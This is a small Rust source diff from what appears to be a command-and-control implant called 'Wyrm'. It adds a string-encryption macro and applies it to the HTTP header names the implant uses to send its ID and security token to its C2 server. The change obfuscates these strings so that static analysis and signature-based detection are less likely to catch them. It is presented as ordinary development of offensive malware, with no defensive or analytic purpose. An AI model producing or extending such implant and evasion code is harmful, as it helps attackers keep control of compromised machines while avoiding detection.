@@ -9,6 +9,7 @@ use shared::{
     net::{TasksNetworkStream, XorEncode, decode_http_response, encode_u16buf_to_u8buf},
     tasks::{Command, Task},
 };
+use str_crypter::{decrypt_string, sc};
 
 /// Constructs the C2 URL by randomly choosing the URI to visit.
 fn construct_c2_url(implant: &Wyrm) -> String {
@@ -121,9 +122,9 @@ fn generate_generic_headers(
 ) -> HashMap<String, String> {
     let mut headers = HashMap::new();
 
-    let _ = headers.insert("WWW-Authenticate".to_string(), implant_id.to_owned());
-    let _ = headers.insert("User-Agent".to_string(), ua.to_string());
-    let _ = headers.insert("Authorization".to_string(), security_token.to_owned());
+    let _ = headers.insert(sc!("WWW-Authenticate", 74).unwrap(), implant_id.to_owned());
+    let _ = headers.insert(sc!("User-Agent", 42).unwrap(), ua.to_string());
+    let _ = headers.insert(sc!("Authorization", 92).unwrap(), security_token.to_owned());
 
     headers
 }
